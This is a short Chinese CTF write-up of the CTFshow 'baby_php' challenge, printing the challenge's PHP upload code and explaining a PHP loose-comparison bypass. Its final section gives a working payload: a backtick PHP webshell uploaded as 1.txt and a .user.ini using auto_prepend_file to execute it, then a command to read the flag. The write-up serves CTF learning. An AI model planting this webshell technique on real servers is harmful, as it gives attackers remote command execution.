---
title: CTFshow记录
tags:
  - CTF
  - web
abbrlink: 82271b5a
date: 2022-04-19 00:24:09
---

### baby杯——baby_php

审计代码，明显是文件上传

```PHP
class fileUtil{

    private $name;
    private $content;


    public function __construct($name,$content=''){
        $this->name = $name;
        $this->content = $content;
        ini_set('open_basedir', '/var/www/html');
    }

    public function file_upload(){
        if($this->waf($this->name) && $this->waf($this->content)){
            return file_put_contents($this->name, $this->content);
        }else{
            return 0;
        }
    }

    private function waf($input){
        return !preg_match('/php/i', $input);
    }

    public function file_download(){
        if(file_exists($this->name)){
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="'.$this->name.'"');
            header('Content-Transfer-Encoding: binary');
            echo file_get_contents($this->name);
        }else{
            return False;
        }
    }

    public function __destruct(){

    }

}

$action = $_GET['a']?$_GET['a']:highlight_file(__FILE__);

if($action==='upload'){
    die('Permission denied');
}

switch ($action) {
    case 'upload':
        $name = $_POST['name'];
        $content = $_POST['content'];
        $ft = new fileUtil($name,$content);
        if($ft->file_upload()){
            echo $name.' upload success!';
        }
        break;
    case 'download':
        $name = $_POST['name'];
        $ft = new fileUtil($name,$content);
        if($ft->file_download()===False){
            echo $name.' download failed';
        }
        break;
    default:
        echo 'baby come on';
        break;
}
```

小知识：$_GET['a']在没有被赋值时默认值时true，case的判定是弱相等

关键代码

```PHP
$action = $_GET['a']?$_GET['a']:highlight_file(__FILE__);

if($action==='upload'){//a只声明不赋值默认为true，强相等判定无法通过
    die('Permission denied');
}

switch ($action) {
    case 'upload'://true=="upload"，判定结果为真，进入upload上传文件
```

查看响应头中间件为nginx，上传.user.ini文件来包含，一定要先上传1.txt文件，不然在auto_prepend_file参数生效并且找不到1.txt时整个环境就废了

```
payload:?a=
POST:
content=<?=`$_GET['kkk']`;?>&name=1.txt
POST:
content=auto_prepend_file="1.txt"&name=.user.ini

payload:?kkk=tac /flag_baby_here_you_are
```

